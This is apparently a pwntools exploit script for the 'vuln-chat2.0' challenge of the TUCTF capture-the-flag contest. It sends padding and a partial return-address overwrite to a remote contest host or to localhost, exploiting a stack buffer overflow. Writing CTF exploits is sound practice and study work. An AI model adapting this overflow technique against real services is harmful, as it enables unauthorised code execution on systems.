#!/usr/bin/python
# encoding: utf-8
from  pwn import *
context.clear(arch='i386')

import time
import sys
binaire='vuln-chat2.0'

if (len(sys.argv)>1):
    TIME=0.0
    elf=ELF(binaire)
    libc=ELF('/opt/libc-database-master/db/libc6-i386_2.19-18+deb8u2_amd64.so')
    host='vulnchat2.tuctf.com'
    port=4242

else:
    TIME=0.0
    elf=ELF(binaire)
#    libc=ELF('libc.so.6')
    host='localhost'
    port=59993

p=remote(host,port)

print p.recvuntil("name: ")
p.sendline("ABCDEFGHIJKLMNO")
print p.recvuntil("O: ")
pop1=0x080483c1 # : pop ebx ; ret
PAD="ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFabcd"
pile="\x72\x86"
p.sendline(PAD+pile)
time.sleep(4)
print p.recvall(10)

exit(0)
